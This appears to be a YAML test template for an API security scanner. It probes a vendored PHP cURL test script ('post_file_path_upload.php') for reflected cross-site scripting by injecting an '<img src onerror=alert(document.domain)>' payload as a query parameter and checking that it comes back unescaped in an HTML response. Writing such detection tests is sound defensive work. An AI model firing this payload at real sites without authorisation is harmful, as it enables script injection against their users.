api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: "host"
      value:
        extract: hostHeaderVal

execute:
  type: single
  requests:
    - req:
        - modify_url: "/vendor/curl/curl/tests/server/php-curl-test/post_file_path_upload.php"
        - modify_method: GET
        - replace_body: '{}'
        - add_query_param:
            key: "<img%20src%20onerror%3dalert(document.domain)>"


validate:
  response_code:
    eq: 200
  response_payload:
    length:
      gt: 0
    contains_all:
      - "key\":\"<img src onerror=alert(document.domain)>\""
  response_headers:
    for_one:
      key:
        eq: "content-type"
      value:
        eq: "text/html"
